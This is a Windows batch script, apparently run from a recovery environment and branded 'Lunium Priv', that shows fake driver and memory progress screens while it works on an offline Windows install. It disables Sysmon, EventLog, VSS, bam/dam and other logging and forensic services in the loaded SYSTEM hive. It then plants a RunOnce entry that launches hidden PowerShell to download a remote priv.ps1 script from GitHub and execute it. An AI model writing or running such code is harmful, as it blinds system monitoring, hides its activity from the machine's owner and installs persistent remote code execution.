echo off
cls
set "arg1=%1"
if /i "%arg1%"=="-damn" (
goto lnext
)
cls
color 5 
echo.
echo.
echo   /$$       /$$   /$$ /$$   /$$ /$$$$$$ /$$   /$$ /$$      /$$       /$$$$$$$  /$$$$$$$  /$$$$$$ /$$    /$$
echo  ^| $$      ^| $$  ^| $$^| $$$ ^| $$^|_  $$_/^| $$  ^| $$^| $$$    /$$$      ^| $$__  $$^| $$__  $$^|_  $$_/^| $$   ^| $$
echo  ^| $$      ^| $$  ^| $$^| $$$$^| $$  ^| $$  ^| $$  ^| $$^| $$$$  /$$$$      ^| $$  \ $$^| $$  \ $$  ^| $$  ^| $$   ^| $$
echo  ^| $$      ^| $$  ^| $$^| $$ $$ $$  ^| $$  ^| $$  ^| $$^| $$ $$/$$ $$      ^| $$$$$$$/^| $$$$$$$/  ^| $$  ^|  $$ / $$/
echo  ^| $$      ^| $$  ^| $$^| $$  $$$$  ^| $$  ^| $$  ^| $$^| $$  $$$^| $$      ^| $$____/ ^| $$__  $$  ^| $$   \  $$ $$/ 
echo  ^| $$      ^| $$  ^| $$^| $$\  $$$  ^| $$  ^| $$  ^| $$^| $$\  $ ^| $$      ^| $$      ^| $$  \ $$  ^| $$    \  $$$/  
echo  ^| $$$$$$$$^|  $$$$$$/^| $$ \  $$ /$$$$$$^|  $$$$$$/^| $$ \/  ^| $$      ^| $$      ^| $$  ^| $$ /$$$$$$   \  $/   
echo  ^|________/ \______/ ^|__/  \__/^|______/ \______/ ^|__/     ^|__/      ^|__/      ^|__/  ^|__/^|______/    \_/        
echo.
echo [92m [+] [97mLoading Drivers... [92mOK.
echo.
echo [92m [+] [97mChecking Network... [92mOK.
echo.
echo [92m [-] [97mGeneral Failure... [91m ERROR!
ping localhost -n 5 >nul 2>&1
exit /b

:lnext
cls
color 5 
echo.
echo.
echo   /$$       /$$   /$$ /$$   /$$ /$$$$$$ /$$   /$$ /$$      /$$       /$$$$$$$  /$$$$$$$  /$$$$$$ /$$    /$$
echo  ^| $$      ^| $$  ^| $$^| $$$ ^| $$^|_  $$_/^| $$  ^| $$^| $$$    /$$$      ^| $$__  $$^| $$__  $$^|_  $$_/^| $$   ^| $$
echo  ^| $$      ^| $$  ^| $$^| $$$$^| $$  ^| $$  ^| $$  ^| $$^| $$$$  /$$$$      ^| $$  \ $$^| $$  \ $$  ^| $$  ^| $$   ^| $$
echo  ^| $$      ^| $$  ^| $$^| $$ $$ $$  ^| $$  ^| $$  ^| $$^| $$ $$/$$ $$      ^| $$$$$$$/^| $$$$$$$/  ^| $$  ^|  $$ / $$/
echo  ^| $$      ^| $$  ^| $$^| $$  $$$$  ^| $$  ^| $$  ^| $$^| $$  $$$^| $$      ^| $$____/ ^| $$__  $$  ^| $$   \  $$ $$/ 
echo  ^| $$      ^| $$  ^| $$^| $$\  $$$  ^| $$  ^| $$  ^| $$^| $$\  $ ^| $$      ^| $$      ^| $$  \ $$  ^| $$    \  $$$/  
echo  ^| $$$$$$$$^|  $$$$$$/^| $$ \  $$ /$$$$$$^|  $$$$$$/^| $$ \/  ^| $$      ^| $$      ^| $$  ^| $$ /$$$$$$   \  $/   
echo  ^|________/ \______/ ^|__/  \__/^|______/ \______/ ^|__/     ^|__/      ^|__/      ^|__/  ^|__/^|______/    \_/        
echo.
echo [92m [+] [97mLoading Drivers... [92mOK.
echo.
echo [92m [+] [97mChecking Network... [92mOK.
echo.
echo [92m [/] [97mAllocating Memory...
for %%i in (C D E F G H I J X K L M N O P) do (
    if exist %%i:\Windows\System32\Config\SYSTEM (
        set WIN=%%i:
        goto found
    )
)
cls
color 5 
echo.
echo.
echo   /$$       /$$   /$$ /$$   /$$ /$$$$$$ /$$   /$$ /$$      /$$       /$$$$$$$  /$$$$$$$  /$$$$$$ /$$    /$$
echo  ^| $$      ^| $$  ^| $$^| $$$ ^| $$^|_  $$_/^| $$  ^| $$^| $$$    /$$$      ^| $$__  $$^| $$__  $$^|_  $$_/^| $$   ^| $$
echo  ^| $$      ^| $$  ^| $$^| $$$$^| $$  ^| $$  ^| $$  ^| $$^| $$$$  /$$$$      ^| $$  \ $$^| $$  \ $$  ^| $$  ^| $$   ^| $$
echo  ^| $$      ^| $$  ^| $$^| $$ $$ $$  ^| $$  ^| $$  ^| $$^| $$ $$/$$ $$      ^| $$$$$$$/^| $$$$$$$/  ^| $$  ^|  $$ / $$/
echo  ^| $$      ^| $$  ^| $$^| $$  $$$$  ^| $$  ^| $$  ^| $$^| $$  $$$^| $$      ^| $$____/ ^| $$__  $$  ^| $$   \  $$ $$/ 
echo  ^| $$      ^| $$  ^| $$^| $$\  $$$  ^| $$  ^| $$  ^| $$^| $$\  $ ^| $$      ^| $$      ^| $$  \ $$  ^| $$    \  $$$/  
echo  ^| $$$$$$$$^|  $$$$$$/^| $$ \  $$ /$$$$$$^|  $$$$$$/^| $$ \/  ^| $$      ^| $$      ^| $$  ^| $$ /$$$$$$   \  $/   
echo  ^|________/ \______/ ^|__/  \__/^|______/ \______/ ^|__/     ^|__/      ^|__/      ^|__/  ^|__/^|______/    \_/    
echo.
echo [92m [+] [97mLoading Drivers... [92mOK.
echo.
echo [92m [+] [97mChecking Network... [92mOK.
echo.
echo [92m [-] [97mAllocating Memory...  [91m ERROR!
ping localhost -n 5 >nul 2>&1
exit /b


:found
cls
color 5 
echo.
echo.
echo   /$$       /$$   /$$ /$$   /$$ /$$$$$$ /$$   /$$ /$$      /$$       /$$$$$$$  /$$$$$$$  /$$$$$$ /$$    /$$
echo  ^| $$      ^| $$  ^| $$^| $$$ ^| $$^|_  $$_/^| $$  ^| $$^| $$$    /$$$      ^| $$__  $$^| $$__  $$^|_  $$_/^| $$   ^| $$
echo  ^| $$      ^| $$  ^| $$^| $$$$^| $$  ^| $$  ^| $$  ^| $$^| $$$$  /$$$$      ^| $$  \ $$^| $$  \ $$  ^| $$  ^| $$   ^| $$
echo  ^| $$      ^| $$  ^| $$^| $$ $$ $$  ^| $$  ^| $$  ^| $$^| $$ $$/$$ $$      ^| $$$$$$$/^| $$$$$$$/  ^| $$  ^|  $$ / $$/
echo  ^| $$      ^| $$  ^| $$^| $$  $$$$  ^| $$  ^| $$  ^| $$^| $$  $$$^| $$      ^| $$____/ ^| $$__  $$  ^| $$   \  $$ $$/ 
echo  ^| $$      ^| $$  ^| $$^| $$\  $$$  ^| $$  ^| $$  ^| $$^| $$\  $ ^| $$      ^| $$      ^| $$  \ $$  ^| $$    \  $$$/  
echo  ^| $$$$$$$$^|  $$$$$$/^| $$ \  $$ /$$$$$$^|  $$$$$$/^| $$ \/  ^| $$      ^| $$      ^| $$  ^| $$ /$$$$$$   \  $/   
echo  ^|________/ \______/ ^|__/  \__/^|______/ \______/ ^|__/     ^|__/      ^|__/      ^|__/  ^|__/^|______/    \_/       
echo.
echo [92m [+] [97mLoading Drivers... [92mOK.
echo.
echo [92m [+] [97mChecking Network... [92mOK.
echo.
echo [92m [+] [97mAllocating Memory... [92mOK.
echo.
echo [92m [/] [97mInitializing SYSTEM...
reg load HKLM\WIN %WIN%\Windows\System32\Config\SYSTEM >nul 2>&1
if errorlevel 1 (
cls
color 5 
echo.
echo.
echo   /$$       /$$   /$$ /$$   /$$ /$$$$$$ /$$   /$$ /$$      /$$       /$$$$$$$  /$$$$$$$  /$$$$$$ /$$    /$$
echo  ^| $$      ^| $$  ^| $$^| $$$ ^| $$^|_  $$_/^| $$  ^| $$^| $$$    /$$$      ^| $$__  $$^| $$__  $$^|_  $$_/^| $$   ^| $$
echo  ^| $$      ^| $$  ^| $$^| $$$$^| $$  ^| $$  ^| $$  ^| $$^| $$$$  /$$$$      ^| $$  \ $$^| $$  \ $$  ^| $$  ^| $$   ^| $$
echo  ^| $$      ^| $$  ^| $$^| $$ $$ $$  ^| $$  ^| $$  ^| $$^| $$ $$/$$ $$      ^| $$$$$$$/^| $$$$$$$/  ^| $$  ^|  $$ / $$/
echo  ^| $$      ^| $$  ^| $$^| $$  $$$$  ^| $$  ^| $$  ^| $$^| $$  $$$^| $$      ^| $$____/ ^| $$__  $$  ^| $$   \  $$ $$/ 
echo  ^| $$      ^| $$  ^| $$^| $$\  $$$  ^| $$  ^| $$  ^| $$^| $$\  $ ^| $$      ^| $$      ^| $$  \ $$  ^| $$    \  $$$/  
echo  ^| $$$$$$$$^|  $$$$$$/^| $$ \  $$ /$$$$$$^|  $$$$$$/^| $$ \/  ^| $$      ^| $$      ^| $$  ^| $$ /$$$$$$   \  $/   
echo  ^|________/ \______/ ^|__/  \__/^|______/ \______/ ^|__/     ^|__/      ^|__/      ^|__/  ^|__/^|______/    \_/     
echo.
echo [92m [+] [97mLoading Drivers... [92mOK.
echo.
echo [92m [+] [97mChecking Network... [92mOK.
echo.
echo [92m [+] [97mAllocating Memory... [92mOK.
echo.
echo [92m [-] [97mInitializing SYSTEM...  [91m ERROR!
ping localhost -n 5 >nul 2>&1
exit /b
)
cls
color 5 
echo.
echo.
echo   /$$       /$$   /$$ /$$   /$$ /$$$$$$ /$$   /$$ /$$      /$$       /$$$$$$$  /$$$$$$$  /$$$$$$ /$$    /$$ 
echo  ^| $$      ^| $$  ^| $$^| $$$ ^| $$^|_  $$_/^| $$  ^| $$^| $$$    /$$$      ^| $$__  $$^| $$__  $$^|_  $$_/^| $$   ^| $$ 
echo  ^| $$      ^| $$  ^| $$^| $$$$^| $$  ^| $$  ^| $$  ^| $$^| $$$$  /$$$$      ^| $$  \ $$^| $$  \ $$  ^| $$  ^| $$   ^| $$ 
echo  ^| $$      ^| $$  ^| $$^| $$ $$ $$  ^| $$  ^| $$  ^| $$^| $$ $$/$$ $$      ^| $$$$$$$/^| $$$$$$$/  ^| $$  ^|  $$ / $$/  
echo  ^| $$      ^| $$  ^| $$^| $$  $$$$  ^| $$  ^| $$  ^| $$^| $$  $$$^| $$      ^| $$____/ ^| $$__  $$  ^| $$   \  $$ $$/   
echo  ^| $$      ^| $$  ^| $$^| $$\  $$$  ^| $$  ^| $$  ^| $$^| $$\  $ ^| $$      ^| $$      ^| $$  \ $$  ^| $$    \  $$$/     
echo  ^| $$$$$$$$^|  $$$$$$/^| $$ \  $$ /$$$$$$^|  $$$$$$/^| $$ \/  ^| $$      ^| $$      ^| $$  ^| $$ /$$$$$$   \  $/   
echo  ^|________/ \______/ ^|__/  \__/^|______/ \______/ ^|__/     ^|__/      ^|__/      ^|__/  ^|__/^|______/    \_/        
echo.
echo [92m [+] [97mLoading Drivers... [92mOK.
echo.
echo [92m [+] [97mChecking Network... [92mOK.
echo.
echo [92m [+] [97mAllocating Memory... [92mOK.
echo.
echo [92m [+] [97mInitializing SYSTEM... [92mOK.
echo.
echo [92m [/] [97mHooking KernelDrv...
reg add "HKLM\WIN\ControlSet001\Services\SysMain" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
reg add "HKLM\WIN\ControlSet001\Services\Sysmon" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
reg add "HKLM\WIN\ControlSet001\Services\SysmonDrv" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
reg add "HKLM\WIN\ControlSet001\Services\PcaSvc" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
reg add "HKLM\WIN\ControlSet001\Services\DiagTrack" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
reg add "HKLM\WIN\ControlSet001\Services\bam" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
reg add "HKLM\WIN\ControlSet001\Services\dam" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
reg add "HKLM\WIN\ControlSet001\Services\VSS" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
reg add "HKLM\WIN\ControlSet001\Services\EventLog" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
reg add "HKLM\WIN\ControlSet001\Services\DPS" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
set result1=0
set result2=0
set result3=0
set result4=0
set result5=0
set result6=0
set result7=0
set result8=0
set result9=0
for /f "tokens=3" %%a in ('reg query "HKLM\WIN\ControlSet001\Services\SysMain" /v Start ^| find "0x4"') do (
    set result1=1
)
for /f "tokens=3" %%a in ('reg query "HKLM\WIN\ControlSet001\Services\Sysmon" /v Start ^| find "0x4"') do (
    set result2=1
)
for /f "tokens=3" %%a in ('reg query "HKLM\WIN\ControlSet001\Services\PcaSvc" /v Start ^| find "0x4"') do (
    set result3=1
)
for /f "tokens=3" %%a in ('reg query "HKLM\WIN\ControlSet001\Services\DiagTrack" /v Start ^| find "0x4"') do (
    set result4=1
)
for /f "tokens=3" %%a in ('reg query "HKLM\WIN\ControlSet001\Services\bam" /v Start ^| find "0x4"') do (
    set result5=1
)
for /f "tokens=3" %%a in ('reg query "HKLM\WIN\ControlSet001\Services\dam" /v Start ^| find "0x4"') do (
    set result6=1
)
for /f "tokens=3" %%a in ('reg query "HKLM\WIN\ControlSet001\Services\VSS" /v Start ^| find "0x4"') do (
    set result7=1
)
for /f "tokens=3" %%a in ('reg query "HKLM\WIN\ControlSet001\Services\EventLog" /v Start ^| find "0x4"') do (
    set result8=1
)
for /f "tokens=3" %%a in ('reg query "HKLM\WIN\ControlSet001\Services\DPS" /v Start ^| find "0x4"') do (
    set result9=1
)

for /f "tokens=3" %%a in ('reg query "HKLM\WIN\ControlSet001\Services\SysmonDrv" /v Start ^| find "0x4"') do (
    set result10=1
)


if %result1% equ 0 goto errorinitializing
if %result2% equ 0 goto errorinitializing
if %result3% equ 0 goto errorinitializing
if %result4% equ 0 goto errorinitializing
if %result5% equ 0 goto errorinitializing
if %result6% equ 0 goto errorinitializing
if %result7% equ 0 goto errorinitializing
if %result8% equ 0 goto errorinitializing
if %result9% equ 0 goto errorinitializing
if %result10% equ 0 goto errorinitializing
if %result1% equ 1 goto sucesshook
if %result2% equ 1 goto sucesshook
if %result3% equ 1 goto sucesshook
if %result4% equ 1 goto sucesshook
if %result5% equ 1 goto sucesshook
if %result6% equ 1 goto sucesshook
if %result7% equ 1 goto sucesshook
if %result8% equ 1 goto sucesshook
if %result9% equ 1 goto sucesshook
if %result10% equ 1 goto sucesshook

:errorinitializing
cls
color 5
echo.
echo.
echo   /$$       /$$   /$$ /$$   /$$ /$$$$$$ /$$   /$$ /$$      /$$       /$$$$$$$  /$$$$$$$  /$$$$$$ /$$    /$$ 
echo  ^| $$      ^| $$  ^| $$^| $$$ ^| $$^|_  $$_/^| $$  ^| $$^| $$$    /$$$      ^| $$__  $$^| $$__  $$^|_  $$_/^| $$   ^| $$ 
echo  ^| $$      ^| $$  ^| $$^| $$$$^| $$  ^| $$  ^| $$  ^| $$^| $$$$  /$$$$      ^| $$  \ $$^| $$  \ $$  ^| $$  ^| $$   ^| $$ 
echo  ^| $$      ^| $$  ^| $$^| $$ $$ $$  ^| $$  ^| $$  ^| $$^| $$ $$/$$ $$      ^| $$$$$$$/^| $$$$$$$/  ^| $$  ^|  $$ / $$/  
echo  ^| $$      ^| $$  ^| $$^| $$  $$$$  ^| $$  ^| $$  ^| $$^| $$  $$$^| $$      ^| $$____/ ^| $$__  $$  ^| $$   \  $$ $$/   
echo  ^| $$      ^| $$  ^| $$^| $$\  $$$  ^| $$  ^| $$  ^| $$^| $$\  $ ^| $$      ^| $$      ^| $$  \ $$  ^| $$    \  $$$/     
echo  ^| $$$$$$$$^|  $$$$$$/^| $$ \  $$ /$$$$$$^|  $$$$$$/^| $$ \/  ^| $$      ^| $$      ^| $$  ^| $$ /$$$$$$   \  $/   
echo  ^|________/ \______/ ^|__/  \__/^|______/ \______/ ^|__/     ^|__/      ^|__/      ^|__/  ^|__/^|______/    \_/        
echo.
echo [92m [+] [97mLoading Drivers... [92mOK.
echo.
echo [92m [+] [97mChecking Network... [92mOK.
echo.
echo [92m [+] [97mAllocating Memory... [92mOK.
echo.
echo [92m [+] [97mInitializing SYSTEM... [92mOK.
echo.
echo [92m [-] [97mHooking KernelDrv...  [91m ERROR!
ping localhost -n 5 >nul 2>&1
exit /b

:sucesshook
cls
color 5 
echo.
echo.
echo   /$$       /$$   /$$ /$$   /$$ /$$$$$$ /$$   /$$ /$$      /$$       /$$$$$$$  /$$$$$$$  /$$$$$$ /$$    /$$ 
echo  ^| $$      ^| $$  ^| $$^| $$$ ^| $$^|_  $$_/^| $$  ^| $$^| $$$    /$$$      ^| $$__  $$^| $$__  $$^|_  $$_/^| $$   ^| $$ 
echo  ^| $$      ^| $$  ^| $$^| $$$$^| $$  ^| $$  ^| $$  ^| $$^| $$$$  /$$$$      ^| $$  \ $$^| $$  \ $$  ^| $$  ^| $$   ^| $$ 
echo  ^| $$      ^| $$  ^| $$^| $$ $$ $$  ^| $$  ^| $$  ^| $$^| $$ $$/$$ $$      ^| $$$$$$$/^| $$$$$$$/  ^| $$  ^|  $$ / $$/  
echo  ^| $$      ^| $$  ^| $$^| $$  $$$$  ^| $$  ^| $$  ^| $$^| $$  $$$^| $$      ^| $$____/ ^| $$__  $$  ^| $$   \  $$ $$/   
echo  ^| $$      ^| $$  ^| $$^| $$\  $$$  ^| $$  ^| $$  ^| $$^| $$\  $ ^| $$      ^| $$      ^| $$  \ $$  ^| $$    \  $$$/     
echo  ^| $$$$$$$$^|  $$$$$$/^| $$ \  $$ /$$$$$$^|  $$$$$$/^| $$ \/  ^| $$      ^| $$      ^| $$  ^| $$ /$$$$$$   \  $/   
echo  ^|________/ \______/ ^|__/  \__/^|______/ \______/ ^|__/     ^|__/      ^|__/      ^|__/  ^|__/^|______/    \_/          
echo.
echo [92m [+] [97mLoading Drivers... [92mOK.
echo.
echo [92m [+] [97mChecking Network... [92mOK.
echo.
echo [92m [+] [97mAllocating Memory... [92mOK.
echo.
echo [92m [+] [97mInitializing SYSTEM... [92mOK.
echo.
echo [92m [+] [97mHooking KernelDrv...  [92mOK.
echo.
echo [92m [/] [97mInitializing SOFTWARE...
reg load HKLM\SOFT "%WIN%\Windows\System32\Config\SOFTWARE" >nul 2>&1
if errorlevel 1 (
cls
color 5 
echo.
echo.
echo   /$$       /$$   /$$ /$$   /$$ /$$$$$$ /$$   /$$ /$$      /$$       /$$$$$$$  /$$$$$$$  /$$$$$$ /$$    /$$ 
echo  ^| $$      ^| $$  ^| $$^| $$$ ^| $$^|_  $$_/^| $$  ^| $$^| $$$    /$$$      ^| $$__  $$^| $$__  $$^|_  $$_/^| $$   ^| $$ 
echo  ^| $$      ^| $$  ^| $$^| $$$$^| $$  ^| $$  ^| $$  ^| $$^| $$$$  /$$$$      ^| $$  \ $$^| $$  \ $$  ^| $$  ^| $$   ^| $$ 
echo  ^| $$      ^| $$  ^| $$^| $$ $$ $$  ^| $$  ^| $$  ^| $$^| $$ $$/$$ $$      ^| $$$$$$$/^| $$$$$$$/  ^| $$  ^|  $$ / $$/  
echo  ^| $$      ^| $$  ^| $$^| $$  $$$$  ^| $$  ^| $$  ^| $$^| $$  $$$^| $$      ^| $$____/ ^| $$__  $$  ^| $$   \  $$ $$/   
echo  ^| $$      ^| $$  ^| $$^| $$\  $$$  ^| $$  ^| $$  ^| $$^| $$\  $ ^| $$      ^| $$      ^| $$  \ $$  ^| $$    \  $$$/     
echo  ^| $$$$$$$$^|  $$$$$$/^| $$ \  $$ /$$$$$$^|  $$$$$$/^| $$ \/  ^| $$      ^| $$      ^| $$  ^| $$ /$$$$$$   \  $/      
echo  ^|________/ \______/ ^|__/  \__/^|______/ \______/ ^|__/     ^|__/      ^|__/      ^|__/  ^|__/^|______/    \_/        
echo.
echo [92m [+] [97mLoading Drivers... [92mOK.
echo.
echo [92m [+] [97mChecking Network... [92mOK.
echo.
echo [92m [+] [97mAllocating Memory... [92mOK.
echo.
echo [92m [+] [97mInitializing SYSTEM... [92mOK.
echo.
echo [92m [+] [97mHooking KernelDrv...  [92mOK.
echo.
echo [92m [-] [97mInitializing SOFTWARE...  [91m ERROR!
ping localhost -n 5 >nul 2>&1
exit /b
)
cls
color 5 
echo.
echo.
echo   /$$       /$$   /$$ /$$   /$$ /$$$$$$ /$$   /$$ /$$      /$$       /$$$$$$$  /$$$$$$$  /$$$$$$ /$$    /$$ 
echo  ^| $$      ^| $$  ^| $$^| $$$ ^| $$^|_  $$_/^| $$  ^| $$^| $$$    /$$$      ^| $$__  $$^| $$__  $$^|_  $$_/^| $$   ^| $$ 
echo  ^| $$      ^| $$  ^| $$^| $$$$^| $$  ^| $$  ^| $$  ^| $$^| $$$$  /$$$$      ^| $$  \ $$^| $$  \ $$  ^| $$  ^| $$   ^| $$ 
echo  ^| $$      ^| $$  ^| $$^| $$ $$ $$  ^| $$  ^| $$  ^| $$^| $$ $$/$$ $$      ^| $$$$$$$/^| $$$$$$$/  ^| $$  ^|  $$ / $$/  
echo  ^| $$      ^| $$  ^| $$^| $$  $$$$  ^| $$  ^| $$  ^| $$^| $$  $$$^| $$      ^| $$____/ ^| $$__  $$  ^| $$   \  $$ $$/   
echo  ^| $$      ^| $$  ^| $$^| $$\  $$$  ^| $$  ^| $$  ^| $$^| $$\  $ ^| $$      ^| $$      ^| $$  \ $$  ^| $$    \  $$$/     
echo  ^| $$$$$$$$^|  $$$$$$/^| $$ \  $$ /$$$$$$^|  $$$$$$/^| $$ \/  ^| $$      ^| $$      ^| $$  ^| $$ /$$$$$$   \  $/       
echo  ^|________/ \______/ ^|__/  \__/^|______/ \______/ ^|__/     ^|__/      ^|__/      ^|__/  ^|__/^|______/    \_/    
echo.
echo [92m [+] [97mLoading Drivers... [92mOK.
echo.
echo [92m [+] [97mChecking Network... [92mOK.
echo.
echo [92m [+] [97mAllocating Memory... [92mOK.
echo.
echo [92m [+] [97mInitializing SYSTEM... [92mOK.
echo.
echo [92m [+] [97mHooking KernelDrv...  [92mOK.
echo.
echo [92m [+] [97mInitializing SOFTWARE...  [92mOK.
echo.
echo [92m [/] [97mHooking Lunium...
ping localhost -n 2 >nul 2>&1
reg delete "HKLM\SOFT\Microsoft\Windows\CurrentVersion\RunOnce" /v UpdateExeVolatile /f >nul 2>&1
reg add "HKLM\SOFT\Microsoft\Windows\CurrentVersion\RunOnce" /v UpdateExeVolatile /d "cmd /c start powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-Type -AssemblyName System.Windows.Forms; $c=(Invoke-WebRequest 'https://github.com/zold1337/toolsvip/raw/refs/heads/main/priv.ps1').Content; iex $c" /f
cls
color 5 
echo.
echo.
echo   /$$       /$$   /$$ /$$   /$$ /$$$$$$ /$$   /$$ /$$      /$$       /$$$$$$$  /$$$$$$$  /$$$$$$ /$$    /$$ 
echo  ^| $$      ^| $$  ^| $$^| $$$ ^| $$^|_  $$_/^| $$  ^| $$^| $$$    /$$$      ^| $$__  $$^| $$__  $$^|_  $$_/^| $$   ^| $$ 
echo  ^| $$      ^| $$  ^| $$^| $$$$^| $$  ^| $$  ^| $$  ^| $$^| $$$$  /$$$$      ^| $$  \ $$^| $$  \ $$  ^| $$  ^| $$   ^| $$ 
echo  ^| $$      ^| $$  ^| $$^| $$ $$ $$  ^| $$  ^| $$  ^| $$^| $$ $$/$$ $$      ^| $$$$$$$/^| $$$$$$$/  ^| $$  ^|  $$ / $$/  
echo  ^| $$      ^| $$  ^| $$^| $$  $$$$  ^| $$  ^| $$  ^| $$^| $$  $$$^| $$      ^| $$____/ ^| $$__  $$  ^| $$   \  $$ $$/   
echo  ^| $$      ^| $$  ^| $$^| $$\  $$$  ^| $$  ^| $$  ^| $$^| $$\  $ ^| $$      ^| $$      ^| $$  \ $$  ^| $$    \  $$$/     
echo  ^| $$$$$$$$^|  $$$$$$/^| $$ \  $$ /$$$$$$^|  $$$$$$/^| $$ \/  ^| $$      ^| $$      ^| $$  ^| $$ /$$$$$$   \  $/       
echo  ^|________/ \______/ ^|__/  \__/^|______/ \______/ ^|__/     ^|__/      ^|__/      ^|__/  ^|__/^|______/    \_/    
echo.
echo [92m [+] [97mLoading Drivers... [92mOK.
echo.
echo [92m [+] [97mChecking Network... [92mOK.
echo.
echo [92m [+] [97mAllocating Memory... [92mOK.
echo.
echo [92m [+] [97mInitializing SYSTEM... [92mOK.
echo.
echo [92m [+] [97mHooking KernelDrv...  [92mOK.
echo.
echo [92m [+] [97mInitializing SOFTWARE...  [92mOK.
echo.
echo [92m [+] [97mHooking Lunium...  [92mOK.
ping localhost -n 2 >nul 2>&1
goto install

:install
cls
color 5 
echo.
echo.
echo   /$$       /$$   /$$ /$$   /$$ /$$$$$$ /$$   /$$ /$$      /$$       /$$$$$$$  /$$$$$$$  /$$$$$$ /$$    /$$ 
echo  ^| $$      ^| $$  ^| $$^| $$$ ^| $$^|_  $$_/^| $$  ^| $$^| $$$    /$$$      ^| $$__  $$^| $$__  $$^|_  $$_/^| $$   ^| $$ 
echo  ^| $$      ^| $$  ^| $$^| $$$$^| $$  ^| $$  ^| $$  ^| $$^| $$$$  /$$$$      ^| $$  \ $$^| $$  \ $$  ^| $$  ^| $$   ^| $$ 
echo  ^| $$      ^| $$  ^| $$^| $$ $$ $$  ^| $$  ^| $$  ^| $$^| $$ $$/$$ $$      ^| $$$$$$$/^| $$$$$$$/  ^| $$  ^|  $$ / $$/  
echo  ^| $$      ^| $$  ^| $$^| $$  $$$$  ^| $$  ^| $$  ^| $$^| $$  $$$^| $$      ^| $$____/ ^| $$__  $$  ^| $$   \  $$ $$/   
echo  ^| $$      ^| $$  ^| $$^| $$\  $$$  ^| $$  ^| $$  ^| $$^| $$\  $ ^| $$      ^| $$      ^| $$  \ $$  ^| $$    \  $$$/     
echo  ^| $$$$$$$$^|  $$$$$$/^| $$ \  $$ /$$$$$$^|  $$$$$$/^| $$ \/  ^| $$      ^| $$      ^| $$  ^| $$ /$$$$$$   \  $/      
echo  ^|________/ \______/ ^|__/  \__/^|______/ \______/ ^|__/     ^|__/      ^|__/      ^|__/  ^|__/^|______/    \_/    
echo.
reg unload HKLM\WIN >nul 2>&1
reg unload HKLM\SOFT >nul 2>&1
echo [92m [+] [97mINITIALIZED.
ping localhost -n 10 >nul 2>&1
wpeutil reboot >nul 2>&1
exit /b
